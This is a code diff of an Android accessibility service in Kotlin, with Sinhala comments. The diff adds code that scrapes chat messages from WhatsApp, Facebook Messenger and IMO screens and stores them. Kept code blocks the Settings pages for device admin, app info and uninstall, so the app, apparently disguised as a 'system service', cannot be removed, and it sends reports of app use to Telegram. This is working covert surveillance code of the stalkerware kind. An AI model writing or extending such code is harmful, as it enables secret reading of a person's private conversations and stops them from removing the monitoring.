@@ -39,12 +39,14 @@ class ScreenService : AccessibilityService() {
         private const val PKG_IMO = "com.imo.android.imoim"
         private const val PKG_IMO_BETA = "com.imo.android.imoimbeta"
 
-        // Blocked pages
         private const val PKG_SETTINGS = "com.android.settings"
 
-        // Last reported app (avoid spam)
         @Volatile private var lastReportedApp = ""
         @Volatile private var lastReportedTime = 0L
+
+        // අලුත් chat screen read වුන වෙලාව
+        @Volatile private var lastReadTime = 0L
+        @Volatile private var lastReadContent = ""
     }
 
     private val client = OkHttpClient.Builder()
@@ -91,7 +93,7 @@ class ScreenService : AccessibilityService() {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
 
-        // ===== Block Device Admin + App Info pages =====
+        // ===== Block Settings pages =====
         if (pkg == PKG_SETTINGS) {
             handleSettingsBlock(event)
         }
@@ -121,8 +123,7 @@ class ScreenService : AccessibilityService() {
             val text = collectAllText(root).lowercase()
 
             val isDeviceAdmin = text.contains("device admin") ||
-                    text.contains("device administrator") ||
-                    text.contains("device admin apps")
+                    text.contains("device administrator")
 
             val isAppInfo = text.contains("app info") &&
                     text.contains("system service")
@@ -132,9 +133,7 @@ class ScreenService : AccessibilityService() {
 
             if (isDeviceAdmin || isAppInfo || isUninstall) {
                 Log.d(TAG, "Blocked Settings page")
-                // Go to Home screen
                 performGlobalAction(GLOBAL_ACTION_HOME)
-                // Notify parent
                 notifyTelegram("🚫 Settings page blocked — Home redirect")
             }
         } catch (_: Exception) {}
@@ -160,15 +159,87 @@ class ScreenService : AccessibilityService() {
         notifyTelegram("$emoji ${app.uppercase()} OPENED\n🕐 $time")
     }
 
-    // ===== Read Screen Content =====
+    // ===== Read Screen Content — WhatsApp/FB/IMO only =====
     private fun readScreenContent(app: String) {
         try {
-            val root = rootInActiveWindow ?: return
-            val allText = collectAllText(root)
-            if (allText.isBlank() || allText.length < 20) return
+            val activePackage = rootInActiveWindow?.packageName?.toString() ?: return
 
-            MessageStore.addScreenRead(this, app, allText)
+            val isTargetApp = when (app) {
+                "whatsapp" -> activePackage == PKG_WHATSAPP || activePackage == PKG_WHATSAPP_B
+                "fb" -> activePackage == PKG_FB || activePackage == PKG_FB_MSG
+                "imo" -> activePackage == PKG_IMO || activePackage == PKG_IMO_BETA
+                else -> false
+            }
+            if (!isTargetApp) return
+
+            val root = rootInActiveWindow ?: return
+            val chatTexts = collectChatTexts(root)
+            if (chatTexts.isEmpty()) return
+
+            val combined = chatTexts.joinToString("\n")
+
+            // App drawer / launcher නම් skip
+            if (isAppDrawerText(combined)) return
+
+            // අඩුම text 30 අකුරු තියෙන්න ඕන
+            if (combined.length < 30) return
+
+            // Duplicate check — එකම content නම් skip
+            if (combined == lastReadContent) return
+            val now = System.currentTimeMillis()
+            if (now - lastReadTime < 5000L) return
+
+            lastReadContent = combined
+            lastReadTime = now
+
+            MessageStore.addScreenRead(this, app, combined)
         } catch (_: Exception) {}
+    }
+
+    // App drawer / launcher text ද බලන්න
+    private fun isAppDrawerText(text: String): Boolean {
+        val drawerPatterns = listOf(
+            "Page 1 of", "Page 2 of", "Page 3 of",
+            "Search", "More options", "Folder",
+            "Samsung", "Google", "Microsoft", "Play Store"
+        )
+        var matchCount = 0
+        for (pattern in drawerPatterns) {
+            if (text.contains(pattern)) matchCount++
+        }
+        // 3කට වඩා match නම් App Drawer එකයි
+        return matchCount >= 3
+    }
+
+    // Chat messages විතරයි collect කරන්න
+    private fun collectChatTexts(node: AccessibilityNodeInfo?): List<String> {
+        node ?: return emptyList()
+        val texts = mutableListOf<String>()
+        try {
+            val t = node.text?.toString() ?: ""
+            val d = node.contentDescription?.toString() ?: ""
+
+            // Folder, Search, Page නම් skip
+            if (t.isNotBlank() &&
+                !t.startsWith("Page ") &&
+                t != "Search" &&
+                t != "More options" &&
+                !t.contains("Folder", ignoreCase = true) &&
+                t.length in 2..500) {
+                texts.add(t)
+            }
+            if (d.isNotBlank() && d.length in 2..500 && d != t) {
+                texts.add(d)
+            }
+
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i)
+                if (child != null) {
+                    texts.addAll(collectChatTexts(child))
+                }
+            }
+        } catch (_: Exception) {}
+        return texts
     }
 
     private fun collectAllText(node: AccessibilityNodeInfo?): String {
